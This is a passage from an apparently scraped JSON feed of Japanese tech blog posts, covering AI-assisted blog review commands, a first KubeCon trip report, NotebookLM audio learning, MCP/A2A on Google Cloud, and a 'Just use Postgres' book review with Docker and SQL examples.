章・節の構成の必要十分性削れる言葉は徹底的に削る。情報の密度を高め、読み手の時間を奪わない文章にするための最終チェックだ。全自動レビューの実行これらを一つずつ実行するのはやはり手間だ。そこで、これらを束ねる /full-review を作成した。# Full Review - 全自動レビュー実行すべての必須レビューを自動で順次実行します。textlint校正から始まり、初学者フィードバック、品質レビューまで一括で実施。## 使用方法/full-review blog.mdこのCommandひとつで、以下のフローが流れる。/textlint-polish（校正）/beginner-feedback（初学者視点）/blog-quality-review（品質スコア）/ai-humanity-check（人間らしさ）一度設定さえしてしまえば、あとは「コマンド一発」で包括的なレビューが完了する。上巻のまとめここまで、Commandsを使ったブログレビュー環境の基礎（Phase 1〜3）を解説してきた。出発点は、「ブログ記事の評価基準がなく、レビューが属人的かつ面倒」という課題だった。これに対し、エージェントを活用して評価観点を構造化し、実行を自動化するというアプローチをとった。ここで重要なのは、AIとの関係性だ。体験や感情といった「身体性」は人間が供給し、それを構造化し整える役割をAIが担う。これはAIへの丸投げではなく、互いの強みを活かした協働である。Commandsによって評価基準を定義し、Gitで管理し、自動化することで、「書くこと」以外のノイズを極限まで減らすことができる。下巻では、より高度なAgents（サブエージェント）の活用と、複数の視点を持つレビュー体制の構築について解説する。下巻に続くsyu-m-5151.hatenablog.com","isoDate":"2025-12-01T15:26:01.000Z","dateMiliSeconds":1764602761000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"1Password の SSH Agent を WSL でも使う","link":"https://qiita.com/yteraoka/items/a056f7c055cc73b06d19","contentSnippet":"パスワード系は 1Password に登録しているのですが SSH の鍵はなんとなく面倒でファイルでローカルに置いたままでした。しかし、バックアップを取るのも面倒だし 1Password で管理しようかなという気になりました。せっかくお金も払っているのだし使えるものは使おう...","isoDate":"2025-12-01T15:07:22.000Z","dateMiliSeconds":1764601642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"初めての海外カンファレンス(KubeCon NA 2024 in Salt Lake City)","link":"https://blog.masasuzu.net/entry/2025/12/01/212119","contentSnippet":"この記事は3-shake Advent Calendar 2025です。qiita.com吉祥寺.pm #37で話した内容となります。kichijojipm.connpass.com speakerdeck.com厳密には10年以上前に行ったことあるんですが、完全に忘れているので実質今回が初回ということでお願いします。今回は業務として、KubeCon NAへ行かせてもらったのでその体験を共有いたします。セッション内容については触れません。旅程的には11/11-17となっており、KubeCon NAの開催期間としては11/12-15となっています。以下の目次で送らせていただきます。出国準備5ヶ月前1か月前前日まで随時往路現地復路事後まとめ出国準備やったことは以下のとおりです。5か月前KubeConチケット手配ホテル予約飛行機手配1ヶ月前パスポート取得ESTA申請Visit Japan登録前日まで荷物準備随時英語技術インプット5ヶ月前KubeCon自体のチケット手配はまとめて会社の方でやっていただきました。ホテルと飛行機はKubeCon割引があったのでこれを利用しました。飛行機はUnited航空の乗継便を予約しました。行きは成田=>ダラス=>ソルトレイクシティー、帰りはソルトレイクシティー=>ロサンゼルス=>成田を予約していました。飛行機が往復で26万円、ホテルが12万円でした。なかなかな値段ですね。同僚と1日違いでチケットを買ったら微妙に値段が変わっていた記憶があります。早めの行動大事ですね。ホテルも飛行機も日本語サイトがあったので特に困った記憶がないです。1か月前数年前にパスポートの期限が切れていたので、これを機に再発行しました。東京都庁地下にパスポートセンターがあるので、ここで申請しました。パスポートセンター横に写真屋さんがあるので、証明写真を準備せずに行っても安心です。だいたい1週間で発行されるので、また1週間後に赴くことになります。渡米する際にESTAを申請する必要があります。ここで注意してほしいのは、検索トップやスポンサーサイトとして出てくるサイトはそれっぽい偽物なので騙されないように注意してください。esta.cbp.dhs.govVisit Japanを事前に登録していくことで日本への帰国時にスムーズになりますのでやっておくことをおすすめします。services.digital.go.jp前日までここまででだいたいやらないといけないことは終わってるので、あとは荷造りです。大きな荷物としては手荷物で入る大きさのトランクケースとビジネスリュックサックの2つを持っていきました。それにプラスしてパスポートと財布と携帯を常に携帯するためのサコッシュも持ち込みました。4泊5日暮らせる最低限の服だけ持ち込みました。だいぶコンパクトになったと思います。基本的に外で食べるつもりはあまりなかったので、全日程の夕食を持ち込みました。オートミール、フリーズドライの味噌汁、粉末スープ類、ルイボスティーなど持っていきました。スープ類にオートミールを入れてレンジで温めればなんとかなります。ここで注意しないといけないのはアメリカは動物性成分が含まれているものは持ち込めません。魚介はOKなのでそのあたり注意しましょう。このへんは国によって違います。電子機器に関しては120V対応しているものはそのままアメリカでも使えます。コンセントの形状は日本と同じですがボルト数が違う形になります。先に言ったようにパスポート、財布、携帯はサコッシュに入れて肌身離さないようにしていました。随時英語はほんとにもっとやっておけばよかったなと思いました。Duolingoはずっとやっていましたが、リスニング、スピーキングという観点からは足りないですね。最近だとスピークバディみたいなAI英会話アプリがあるのでそのあたりもっとやり込んでおけばよかったなと後悔してます。あとやったこととしては、CNCFのyoutubeチャネルに大量の過去のKubeConアーカイブがあるのでそれでひたすら耳をならしてました。www.youtube.com往路実を言うとですね。出国する当日朝まで沖縄にいました。出国当日はこんな感じでした。11/7 午前 羽田着11/7 昼 家で荷物最終チェック11/7 夕方成田出発沖縄から帰る飛行機がちゃんと飛んで良かったと心から思います。普通はこんなことしないです。いろいろ重なって仕方なかったのでした。ということで、行きは成田発、デンバー乗り継ぎ、ソルトレイクシティーという行程です。。。。。でした。デンバー行きの飛行機に乗っていて途中で行き先がアンカレッジ(アラスカ州)に変わってることに気が付きます。急病人救護のためにアンカレッジに緊急着陸することになりました。なんやかんやあって無事デンバーには到着するのですが、当然乗継便には間に合わずなので振り返る必要がありました。自分はアンカレッジ出発時点までにかすかな電波を頼りにスマートフォンから振替を行ったのですが、同僚たちは電波がなく何もできなかったので、自動的に翌日の便に振り返られてしまいました。ちょっとそれは困るのですが、この時点ではどうにもならないのでいったんデンバーに到着し入国審査を受けることになりました。正直入国審査はかなり厳しくされるのかなと不安になっていたのですが、案外すんなり通って拍子抜けしました。デンバーの空港にてなんとか本日便で乗り継げないか交渉することになりました。どうやら現状満席の便でもウェイティングリストに入ることでキャンセル待ちに並ぶことができてうまくいけば本日便で行けそうだということがわかりました。Uniteの係員の人がウェイティングリスト登録のためにコマンドプロンプトを駆使してたのが印象的でした。コマンド操作でやるんですねと感心しました。ともあれ、初っ端からトラブルに見舞われましたが拙い英語でもなんとか乗り切ることができました。なんやかんやあって、ソルトレイクシティーまでたどり着くことができました。現地空港からホテルまではLRTで移動しました。TransitというアプリでOne-Wayチケットを購入して乗るみたいでした。チケットをActivateして乗るのですが、QRコード自体はあるのですが、最後まで誰にも見せることなく下車しました。これが信用乗車方式か。。。となりました。会場はめっちゃ広いし、めっちゃ人が多くて、これが本場か、、、と圧倒されました。飲み物はいたるところにありました。コーヒーに困ることはありませんでした。ランチボックスが無料配布されてることに4日目に気が付きました。それまで、毎回ホテルに帰ってオートミールを食べる生活をしていました。毎回ランチに必ずお菓子が含まれているのはアメリカンな文化なのでしょうか。ランチはビーフ、チキン、ベジタリアン、ビーガン、グルテンフリーから選べました。なんというか文化を感じますね。英語に自身なかったので、文字起こしと翻訳をしてくれるSaaSアプリを試してたのですが、いまいち制度が低くてあまり役に立たなかったでした。これもあとから気づいたのですが、ルームごとにQRが貼ってあって、そこにアクセスすると文字起こしと翻訳をしてくれるアプリケーションが用意されていました。今回いたるところで自分の情報弱者ぶりを感じてしまいました。KubeConのセッション自体はYoutubeにすぐ上がるので、その場で頑張りすぎずにあとで復習するのがよいです。ただ、現地でしか体験できない雰囲気を味わえたことはすごく良い経験になりました。現地での日本人交流会ではバリバリKubernetesをつかっている人たちの生の声が聞けて刺激になりました。復路特筆すべきことはないですVisit Japanをあらかじめ登録しておいたので、入国審査と税関はすんなりと通過できました。事後経費採算しっかししましょう。経費採算終わるまでが出張ですまとめ往路がこすぎてソルトレイクシティーについた瞬間もう帰っていいかなという気持ちになりました。トラブルはありつつも一つ一つこなしていけばまあなんとかなるものだなと思いました。英語はほんとにちゃんとやっておきたかったなと言う気持ちが強いです。もっとできてれはもっと実りが多かったなと。当たり前の話ですが、羽田、成田の乗り継ぎはやめたほうが望ましいです。社会人は余裕持った行動をしましょう(?)いろいろもっとうまくやりたかったという気持ちはありつつも本場のでっかいカンファレンスに参加して色んな意味で刺激を受けました。また英語もそうですし、知識レベルを上げて海外カンファレンス再挑戦したいです。来年はre:Invent行たいです!さて、真面目なまとめは同僚が書いてるのでこちらを参照してください。sreake.comそれでは。","isoDate":"2025-12-01T12:21:19.000Z","dateMiliSeconds":1764591679000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GitHub Actionsの「なぜか動く」を分解する：npm publishとGITHUB_TOKEN","link":"https://zenn.dev/meziron/articles/fef6ccca887f97","contentSnippet":"GitHub Actionsの「なぜか動く」を分解する：npm publishとGITHUB_TOKEN最近、非エンジニアの人やエンジニアなりたての人と作業することがあります。そこで自分が組んだGithub Actionsについて質問をもらいました。「このyamlってプログラミング言語じゃないのになんでこういうふうに書くことで動くの？」「初めてみても何が何をしているの全然直観的じゃなくて、これから自分で書ける自信がない・・・」上記のような言葉をもらいました。実際、GitHub Actionsを使っていると、コピペでなんとなく動いてはいるものの、「裏で何が起きているのかよく...","isoDate":"2025-12-01T08:25:59.000Z","dateMiliSeconds":1764577559000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"Instructorの紹介","link":"https://zenn.dev/meziron/articles/2d1a1006851423","contentSnippet":"InstructorライブラリとClean Architectureで実現する型安全なAI統合パターン はじめに近年、業務アプリケーションにAI機能を組み込む事例が急速に増えています。しかし、AIの出力は本質的に不確実性を含むため、従来のWebアプリケーション開発で重視されてきた型安全性や保守性を維持することが課題となっています。本記事では、InstructorライブラリとClean Architectureを組み合わせることで、型安全で保守性の高いAI統合パターンを実現する方法を紹介します。特に、複雑な業務ロジックを持つアプリケーションでAIを活用する際のベストプラクティス...","isoDate":"2025-12-01T08:25:58.000Z","dateMiliSeconds":1764577558000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"学術的根拠から読み解くNotebookLMの音声活用法","link":"https://shu-kob.hateblo.jp/entry/2025/12/01/005741","contentSnippet":"この記事はQiita 3-shake Advent Calendar 2025 シリーズ1日目の記事です。2025年11月22日(土)に、Google Developer Group - DevFest Tokyo 2025があり、その招待制懇親会でLTをさせていただく機会がありました。「学術的根拠から読み解くNotebookLMの音声活用法」というタイトルで、NotebookLMの音声解説で学習する際のポイントを過去のマルチメディア学習の学術的根拠や実験を基にまとめました。 speakerdeck.com1ページずつ解説をさせていただきたいと思います。1枚目1枚目は表紙です2枚目2枚目は自己紹介です。3枚目Notebookでの音声を作る操作方法です。画面にドキュメントなどをアップロードし、音声解説ボタンを押すだけで簡単に作れます。音声は、男女掛け合いのPodcast形式です。4枚目仕事や学業で、難解なドキュメントを読む場面は多々あると思いますが、NotebookLMの音声解説機能により、学習効率が高められるか期待が高まっています。AIによって作られた音声がどれだけ学習効果があるか過去のマルチメディア学習の学術的根拠実験を基に解説していきます。5枚目学習効果を測定する実験も行いました。とある専門的なドキュメントを音声化して実験に用いました。被験者は熟達者（エキスパート）と初学者のグループに分かれます。熟達者、初学者でそれぞれ、音声の元となったドキュメントのみ読んで学習したグループ、音声のみ聴いて学習したグループ、両方を用いたグループに分かれ、学習後に4択の理解度チェックテストを受けてもらいました。GoogleスライドをPDF化して文字が崩れているので、直せるなら直しておきます。6枚目ドキュメント・音声の両方を用いたグループが優位に思えましたが、結果はご覧の通り。初学者は、実験を1回のみ行い、両方 > 音声のみ > ドキュメントのみ、という期待通りの結果でしたが、熟達者は、実験を3回行い、両方グループが最高点を取るとは限りませんでした。なぜ、熟達者は両方グループが優位とは限らなかったのでしょうか？7枚目初学者の説明です。初学者は音声学習を順書立てて勉強するのが有効です。構造的ガイダンスを提供することを足場かけ理論といいます。また、初学者の両方グループは音声を主、ドキュメントを従（文章を読むより、俯瞰的に見る）ことにより、認知負荷分散につながりました。8枚目一方の熟達者の説明です。熟達者は、初学者に有効な順序立てた構造的ガイダンスが邪魔になることがあります。熟達者の知識ネットワークに対して、手厚い構造的ガイダンスが知識をマッピングするのが非常に認知負荷が高いためです。これを熟達化のリバーサル効果といいます。また、熟達者の両方群は音声とドキュメント両方から情報を得ようと頑張り、認知負荷が高い状態でした。9枚目実験の制約により、不利な面もありました。実験の時間の都合上、音声の一時停止、巻き戻しを禁止していました。音声を一時停止、巻き戻して、自分のペースで聴けるなら、熟達者の両方グループは、音声とドキュメント両方からしっかり情報を取れていた可能性があります。学習者のペースを守らせることが効率を上げるのですが、例えば、音声や動画の学習をする際、数分ごとに区切って、学習者が「次へ」を押すことで次のパートが始まると学習がしやすいです。このことを「セグメンテーション原理」と呼ぶのですが、実験の制約上、阻害されたことになります。また、熟達者の実験の中で、音声のみグループの平均点が低いときがありました。それは、グラフ・図を見ていないと難しい問題が多く、音声でグラフ・図など視覚的な情報伝達が難しいことを意味します。また、各グループの点数のばらつきでは、ドキュメントのみグループが最も大きかったです。これは当然と言えば当然で、ドキュメント学習は各個人の学習能力に大きく左右されるためです。一方、音声は画一的な指導が可能とも言えます。10枚目実験や学術的根拠から読み解く、音声学習のおすすめとしては、学習者の習熟度を考慮し、初学者は音声とドキュメント両方を併用し、音声を主、ドキュメントを従とするのが良いでしょう。一方、熟達者は各個人で使い分けをするのがよく、概要把握や復習、思い出すなどの目的では音声、詳細や図表の把握はドキュメントを使うのがよく、安易に両方同時に使うと認知負荷を増大させるリスクがあります。11枚目参考文献です。一部、有料のものもありますが、Web検索等で概要を知ることもできます。12枚目終わりましたが、他の勉強会での登壇情報です。2025年11月27日(木)に、Jagu\'e\'r 月末 Tech Lunchの勉強会「月末 Tech Lunch Online#7 - Google Cloud を語る！-」に「MCP・A2A概要 〜Google Cloudで構築するなら〜」というタイトルで登壇した話は、ブログ記事にまとめていますので、よろしければご覧ください。shu-kob.hateblo.jp最後にqiita.com3-shake Advent Calendar 2025 シリーズ2の1日目はmasasuzuさんが書いてくれています。シリーズ1の2日目はyteraokaさんの「VPC Lattice を理解したい」シリーズ2の2日目はnwiizoさんの「生成AIエージェントによるブログレビュー環境の構築（上）」です。今後もお楽しみに！","isoDate":"2025-11-30T15:57:41.000Z","dateMiliSeconds":1764518261000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"MCP・A2A概要 〜Google Cloudで構築するなら〜","link":"https://shu-kob.hateblo.jp/entry/2025/12/01/001432","contentSnippet":"この記事はQiita Jagu\'e\'r Advent Calendar 2025の1日目の記事です。2025年11月27日(木)に、Jagu\'e\'r 月末 Tech Lunchの勉強会「月末 Tech Lunch Online#7 - Google Cloud を語る！-」に「MCP・A2A概要 〜Google Cloudで構築するなら〜」というタイトルで登壇させていただきましたので、その発表内容でのポイントを記事化したいと思います。AIエージェントが流行っているけど、MCPやA2Aという概念は難しいやろうと思い、噛み砕いて説明したいというのが発表のモチベーションでした。 speakerdeck.comなお、今回の資料は、NotebookLMで作成しました。ここまで作れるのはすごいです！1ページずつ解説をさせていただきたいと思います。1枚目1枚目は表紙です。2枚目2枚目は、アジェンダで、全体の話の流れを書いています。3枚目3枚目は、LLMの制約について述べています。LLMは「Brain in a Jar」（瓶の中の脳）とも言われ、賢いけど、手足を持たなくて実行能力のないものの例えです。例えば、学習時点までの知識しか知りません。これをナレッジカットオフといいます。「今日の株価」「明日の天気」「最新のニュース」などは分かりません。また、旅行のプランをLLMに尋ねても、航空券やホテルの予約はしてくれません。APIなどを操作し、データベースのトランザクション操作をする実行能力はないのです。4枚目ここで、LLMの制約を解決する手段として、MCPの話が出てくるのに加え、さらなる機能拡張のためにA2Aの話が出てきます。MCPはLLMに実行能力を与えます。A2Aはエージェント同士が連携し、より複雑なことができるようになる仕組みです。5枚目MCP(Model Context Protocol)は外部ツールやデータへのアクセスを標準化するプロトコルです。LLMという脳に手足を与えて、検索やAPI操作ができるようになり、APIを介してデータベースのトランザクション操作ができるようになるのです。ここでポイントは、推論機能と実行機能を分離して疎結合に実装するということです。6枚目A2A(Agent-to-Agent)は、AIエージェント同士で、連携するためのプロトコルです。能力を記述したAgent CardがAIエージェントの名刺となり、どのエージェントにどのタスクを任せるかの判断ができます。また、通信プロトコルが定められているため、拡張性に優れています。7枚目MCPとA2Aのご紹介をしましたが、Google CloudでMCPやA2Aをどう構築していくかのポイントに移りましょう。まず、認知（推論）機能と実行機能を分離することクラウドを利用する上で、サーバーレスファーストが大事であること（8枚目で詳説）誰も信頼せずとも動くゼロトラストセキュリティであることです。8枚目Google CloudでのMCPサーバー構築は、Cloud Runを使うのが定石です。サーバーレスでありコスト最適化できます。また、高いスケーラビリティに対応していて、コンテナベースで、デプロイが容易です。9枚目MCPサーバーをCloud Runで構築する際の注意点です。ローカル開発で使うようなstdio（Standard I/O）はCloud Runでは使用できないため、Streamable HTTPかSSE over HTTPを使う必要があります。最近では、新しいStreamable HTTPの方が推奨となっています。10枚目一方、A2A対応のエージェントの構築は、Vertex AI Agent Engineが最適です、フルマネージドサービスで、A2Aのプロトコルに準拠しており、Agent Registoryによるガバナンスも効いています。11枚目A2Aエージェントを構築するためのポイントです。スライドには文言が書いていませんが、ADK(Agent Development Kit)を用いた方法です。AgentCardの定義、使用するLLMやツールの定義、タスク処理のロジックを実装し、これらをA2Agentで統合し、A2A準拠のエージェントを作成できます。12枚目MCPとA2Aを連携させた構築例です。「Social Agent」というのは友人の好みを推論するエージェントです。外部連携、つまり実行部分はMCPを用いて、推論と実行の分離を行います。13枚目簡単にAIエージェントが開発できるようになると、企業内でみんな好き勝手にエージェントを作り始めて、野良エージェントが増えそうですが、Gemini Enterpriseによる一元管理でガバナンスを効かせられます。14枚目MCPもA2Aもオープンプロトコルであるため、拡張性に優れています。インターネットでもTCP/IPというオープンプロトコルのおかげで相互運用性があるように、AIエージェントもどんどん拡張していき、どんどん便利な世の中になるのかもしれません。最後にお読みいただきありがとうございました。2日目のQiita Jagu\'e\'r Advent Calendar 2025は、pHaya72さん「テクサミの宣伝」です。qiita.com空きもまだありますので、Jagu\'e\'r 会員の方はぜひ書きましょう！私もできれば、複数記事書きます！","isoDate":"2025-11-30T15:14:32.000Z","dateMiliSeconds":1764515672000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"【小ネタ】pytest-bddを使ってみた","link":"https://dev.mix64.com/2025/11/30/pytest-bdd/","contentSnippet":"はじめに 今回は pytest-bdd ついて紹介します。名前の通り BDD（Behavior Driven Development, テス...","isoDate":"2025-11-30T11:15:35.000Z","dateMiliSeconds":1764501335000,"authorName":"ayibote","authorId":"ayibote"},{"title":"【解説】コード生成の最適化によるLinuxコンテキストスイッチの改善パッチ","link":"https://dev.mix64.com/2025/11/29/optimize-code-generation-during-context-switching/","contentSnippet":"はじめに 今回は2025年11月にXie Yuanbin氏によって提案された一連のパッチシリーズ「Optimize code generat...","isoDate":"2025-11-29T14:45:43.000Z","dateMiliSeconds":1764427543000,"authorName":"ayibote","authorId":"ayibote"},{"title":"名前が似てる LookerとLooker Studioの違いとは?","link":"https://sreake.com/blog/differences-between-looker-and-looker-studio/","contentSnippet":"はじめに こんにちは。 以前、Looker、LookMLについての記事を投稿してからしばらく経ちました。 今は生成AIの登場により、Lookerも様々な機能追加や活用の場が増えてきています。 それと同時に、このような言葉 […]The post 名前が似てる LookerとLooker Studioの違いとは? first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-11-28T02:32:06.000Z","dateMiliSeconds":1764297126000,"authorName":"Sreake","authorId":"Sreake"},{"title":"MCP・A2A概要 〜Google Cloudで構築するなら〜","link":"https://speakerdeck.com/shukob/mcpa2agai-yao-google-clouddegou-zhu-surunara","contentSnippet":"「Jagu\'e\'r 月末 Tech Lunch Online#7 - Google Cloud を語る！-」にて、\\rAIエージェントのMCPとA2Aの概要と、それらをGoogle Cloudで構築する上でのTipsを紹介させていただきました。\\rhttps://jaguer-tech-lunch.connpass.com/event/362363/","isoDate":"2025-11-27T05:00:00.000Z","dateMiliSeconds":1764219600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェントの自律性と協調性を解放する Google CloudによるMCP・A2A実装のエンタープライズ戦略","link":"https://speakerdeck.com/shukob/20251125-ri-ben-sheng-cheng-aiyusahui-xiao-yuan-part2","contentSnippet":"2025年11月25日の日本生成AIユーザ会「#19 MCP・A2A概要 〜Google Cloudで構築するなら〜」にて発表に使用した資料2部あるうちの後半部分です。\\rhttps://genai-users.connpass.com/event/376260/\\r\\r↓前半部分はこちらです\\rhttps://speakerdeck.com/shukob/aiezientoru-men-zi-lu-xing-noji-chu-karaopunpurotokorumcpa2aniyorulian-xi-made","isoDate":"2025-11-25T05:00:00.000Z","dateMiliSeconds":1764046800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント入門 自律性の基礎からオープンプロトコルMCP・A2Aによる連携まで","link":"https://speakerdeck.com/shukob/aiezientoru-men-zi-lu-xing-noji-chu-karaopunpurotokorumcpa2aniyorulian-xi-made","contentSnippet":"2025年11月25日の日本生成AIユーザ会「#19 MCP・A2A概要 〜Google Cloudで構築するなら〜」にて発表に使用した資料2部あるうちの前半部分です。\\rhttps://genai-users.connpass.com/event/376260/\\r\\r↓後半部分はこちらです\\rhttps://speakerdeck.com/shukob/20251125-ri-ben-sheng-cheng-aiyusahui-xiao-yuan-part2","isoDate":"2025-11-25T05:00:00.000Z","dateMiliSeconds":1764046800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"「Postgres で試した？」と聞き返せるようになるまでもしくはなぜ私は雰囲気で技術を語るのか？ — Just use Postgres 読書感想文","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/25/135220","contentSnippet":"はじめに「Just use Postgres」という言葉を初めて聞いたのは、いつだったか覚えていません。Twitter か Hacker News か、あるいは社内の Slack か。どこで聞いたにせよ、私の反応は決まっていました。「また極端なことを言う人がいる」と。「それ、〇〇でもできますよ」——この手のフレーズはもう100回は聞いてきました。そして大抵の場合、その〇〇は専用ツールに置き換えられていきます。技術が専門分化していくのは自然な流れです。全文検索なら Elasticsearch。時系列データなら InfluxDB。メッセージキューなら RabbitMQ。それぞれの分野に専門家がいて、専用のソリューションがあって、ベストプラクティスがあります。「とりあえず Postgres で」なんて、それは思考停止ではないか、と。でも、心のどこかで気になっていたんです。www.manning.comソフトウェアエンジニアとして 10 年近く働いてきて、システムが複雑化していく様子を何度も見てきました。「全文検索だから Elasticsearch」と導入したら、その運用は誰がやるのか。バックアップは？　モニタリングは？　バージョンアップは？　構成図に新しい箱が増えるたびに、誰かが深夜 3 時のアラート対応をする可能性が増えます。その「誰か」は、たいてい自分です。以前関わったプロジェクトでは、Postgres、Redis、Elasticsearch、RabbitMQ、InfluxDB が同居していました。それぞれに理由があって導入されたはずですが、3 年後には「なぜこれが必要だったのか」を説明できる人が誰もいなくなっていました。ドキュメントはあっても、判断の背景までは残っていません。結局、「触ると怖いから残しておこう」という判断になります。技術的負債の典型です。syu-m-5151.hatenablog.comこの本を手に取ったのは、そういう日常からの逃避だったのかもしれません。「Postgres だけで済むなら、楽になれる」そんな甘い期待を持って読み始めました。そして、最初の数ページで気づきました。この本が言っているのは、私が思っていたことと少し違います。「Postgres は万能だから全部 Postgres でやれ」ではありません。「既に Postgres を使っているなら、新しいデータベースを追加する前に、まず Postgres で試してみよう」ということです。その違いに気づいた瞬間、なんというか、肩の力が抜けました。これは、銀の弾丸を売りつける本ではなかったんです。私たちが日々向き合っている「技術選定」という名の意思決定に、1 つの視点を提供してくれる本でした。10 年近くこの仕事をしてきて、技術選定について 1 つ学んだことがあります。新しい機能や技術が出たとき、いきなり飛びつかない。どれだけ魅力的に見えても、まず「運用時にどうなるか」を考えます。誰がバックアップを取るのか。障害時に誰が対応するのか。3 年後にメンテナンスできる人がいるのか。流行りの技術を追いかけることと、本番環境で安定して動かすことは、別の話です。これは、Postgres の中でも同じです。pgvector や TimescaleDB のような比較的新しい拡張、あるいは Postgres 本体の新機能についても、本番投入前に運用面を検討する必要があります。「Postgres だから安心」ではなく、「その機能が十分に枯れているか」を見極める姿勢が大事です。かといって、新しいことを学ばないわけにもいきません。技術は進歩します。昨日のベストプラクティスが、明日には技術的負債になることもあります。結局のところ、謙虚に学び続けるしかありません。私が最近考えているのは、こういう基準です。替えの利く技術は、流行に従う。フロントエンドのフレームワークとか、CI/CD ツールとか。入れ替えやすいものは、その時点でのベストを選べばいい。替えの利きづらい基盤は、標準に従う。データベースとか、認証基盤とか。長く使うものは、実績のある標準的な選択をする。競争優位の核は、自ら設計する。ビジネスの差別化に直結する部分は、自分たちで考え抜いて設計する。Postgres は、競争優位の核になる場合もありますが、基本的には 2 番目の「替えの利きづらい基盤」であることが多いです。40 年以上の実績があり、コミュニティ主導で開発され、世界中で使われている標準的な選択肢。だからこそ、その可能性を正しく理解しておきたいと思いました。だから、読み進めることにしました。正直に言うと、全部を理解できたわけではありません。「FOR UPDATE SKIP LOCKED」の仕組みを完全に説明しろと言われたら、今でもちょっと怪しいです。でも、それでいいと思うことにしました。完璧に理解することが目的ではありません。「Postgres で試した？」その一言を、自信を持って言えるようになること。それが、この本を読む目的でした。なので、この読書感想文には私の手元で動かした実行結果と書籍の中身がごちゃ混ぜになっています。基本的に明記しているつもりですが抜けていたらごめんなさい。Just Use Postgres!: All the database you need (English Edition)作者:Magda, DenisManningAmazonこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、はじめていきます。1. Meeting Postgres「Just use Postgres」の再解釈1.2 節の「Just use Postgres」の説明を読んで、自分の理解が間違っていたことに気づきました。私はこれまで、「Just use Postgres」を技術選定の初手として捉えていました。「新規プロジェクトならとりあえず Postgres 立てとけ」みたいな。でも、著者が書いているのは違います。Does this mean Postgres has become a Swiss Army knife and the only database every developer needs? Certainly not.著者は明確に否定しています。Postgres は万能ツールではない、と。じゃあ「Just use Postgres」は何を意味するのでしょうか。「既に Postgres を使っているチームが、新しいユースケース（地理空間、時系列、生成 AI など）が発生したとき、別のデータベースを追加する前に Postgres で解決できるか確認してみよう」これがこのモットーの正しい解釈だと著者は言います。インフラエンジニアとして 10 年近く運用してきた身としては、この視点の転換にハッとしました。「Elasticsearch で全文検索やりたい」と言われた時、私は内心「またか…（心の中で構成図に新しい箱を追加する手が震える）」と思っていました。でも、「Postgres で試した？」と聞き返すことはしませんでした。自分の仕事を増やしたくないという気持ちが先に立って(自分が起こされるのにね)。これ、逆だったんです。Postgres で解決できるなら、新しいデータベースを追加するより運用負荷は減ります。バックアップ戦略も、モニタリングも、アラートルールも、既存のまま使えます。運用対象が増えるたびに、前世で何をしたのかと深夜に考える機会も減ります。この本を読み終えて、「Postgres で試した？」と自信を持って聞き返せるようになったと思います。良いか悪いかは別として。なぜ Postgres が人気なのか1.1 節では、Postgres が人気な 3 つの理由が挙げられています。オープンソース・コミュニティ主導: 1994 年に MIT ライセンスでオープンソース化。単一ベンダーではなくコミュニティ主導で開発。エンタープライズ対応: 35 年の開発で培われた信頼性と堅牢性。年次メジャー バージョン リリース、段階的 改善 重視。拡張性: Michael Stonebraker が設計当初から拡張性を重視。JSON、時系列、全文検索、ベクトル類似検索など多様なユースケースに対応。この 3 つ目の「拡張性」が、「Just use Postgres」を可能にしている核心だと感じました。著者の言葉を借りれば、Postgres は「従来のトランザクショナルワークロードを超えた幅広い用途に対応できる」。だから、新しいユースケースが出てきても、まず Postgres で試す価値があります。運用の観点からも、この 3 つは重要です。オープンソースだから、ベンダーロックインのリスクがないエンタープライズ対応だから、夜中3時にPagerDutyが鳴って「どの DB だ...？」と確認する時間を省略できるインフラエンジニアとして信頼できる拡張性があるから、新しいデータベースを追加する代わりに既存の Postgres を活用できるDocker でサクッと起動1.3 節では、Docker での起動方法が紹介されています。docker run --name postgres \\\\    -e POSTGRES_USER=postgres -e POSTGRES_PASSWORD=password \\\\    -p 5432:5432 \\\\    -v postgres-volume:/var/lib/postgresql/data \\\\    -d postgres:17.2「1 分以内にコンテナとして起動可能」と Summary に書いてありますが、本当にその通りです。この手軽さが、「Just use Postgres」の実践を支えています。新しいユースケースを試すために、まず手元で動かしてみる。それが 1 分でできます。ツールを開発していることがあるのですがこれはツールの普及にめちゃくちゃ大事です。開発環境だからシンプルな設定で OK ですが、本番では当然違います。ユーザー名は postgres 以外にする、パスワードは環境変数じゃなく secrets で管理する、など。でも、それはこの本の scope 外でしょう。PostgreSQL徹底入門 第4版 インストールから機能・仕組み、アプリ作り、管理・運用まで作者:近藤 雄太,正野 裕大,坂井 潔,鳥越 淳,笠原 辰仁翔泳社Amazonpsql と generate_series1.4 節では psql での接続方法、1.5 節では generate_series を使ったモックデータ生成が紹介されています。INSERT INTO trades (id, buyer_id, symbol, order_quantity, bid_price, order_time)SELECT    id,    random(1,10) as buyer_id,    (array[\'AAPL\',\'F\',\'DASH\'])[random(1,3)] as symbol,    random(1,20) as order_quantity,    round(random(10.00,20.00), 2) as bid_price,    now() as order_timeFROM generate_series(1,1000) AS id;generate_series と random の組み合わせで、複雑なモックデータを SQL だけで生成できます。外部ツール不要。これも「Just use Postgres」の一例だと感じました。「テストデータ生成ツールが必要だ」と言い出す前に、Postgres の標準機能で解決できます。普段、テストデータ生成はアプリ側（Rust）でやることが多かったのですが、シンプルなケースなら generate_series で十分かもしれません。試しに手を動かしてみたら、いくつか発見がありました。まず、generate_series は日付生成にも使えます。generate_series(\'2025-01-01\'::date, \'2025-12-31\', \'1 day\') でカレンダーテーブルを一発生成できます。これは便利。次に、random() は毎回異なる値を返すので、再現可能なテストには setseed() を事前に呼ぶ必要があります。これを知らずに「テスト結果が毎回違う！」と焦った経験があります。そして一番ハマったのは、配列のインデックスが 1 始まりだということ。(array[\'AAPL\',\'F\',\'DASH\'])[random(1,3)] のように 1 から始めないと想定外の結果になります。Rust や Python 